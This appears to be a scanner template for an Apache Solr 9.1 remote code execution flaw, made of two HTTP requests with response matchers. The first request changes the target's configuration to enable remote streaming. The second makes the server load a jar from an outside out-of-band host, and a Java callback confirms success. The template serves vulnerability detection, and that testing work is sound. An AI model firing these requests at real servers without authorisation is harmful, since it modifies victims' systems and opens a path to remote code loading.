id: apache-solr-rce
brief:
    title: Apache Solr 9.1 - Remote Code Execution
    by: j4vaovo
    level: critical
    about: Apache Solr 9.1 is vulnerable to RCE.
    label:
        - solr
        - apache
        - rce
        - oast
        - intrusive
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/solr/gettingstarted_shard1_replica_n1/config'
      head:
        Content-Type: application/json
      body: '{  "set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
      signs:
        - "on": word
          has:
            - http
          in: interactsh_protocol
          need: all
        - "on": word
          has:
            - 'User-Agent: Java'
          in: interactsh_request
          need: all
    - verb: POST
      to:
        - '{{BaseURL}}/solr/gettingstarted_shard2_replica_n1/debug/dump?param=ContentStreams'
      head:
        Content-Type: multipart/form-data; boundary=------------------------5897997e44b07bf9
      body: |-
        --------------------------5897997e44b07bf9
        Content-Disposition: form-data; name="stream.url"

        jar:http://{{interactsh-url}}/test.jar?!/Test.class
        --------------------------5897997e44b07bf9--
      signs:
        - "on": word
          has:
            - http
          in: interactsh_protocol
          need: all
        - "on": word
          has:
            - 'User-Agent: Java'
          in: interactsh_request
          need: all
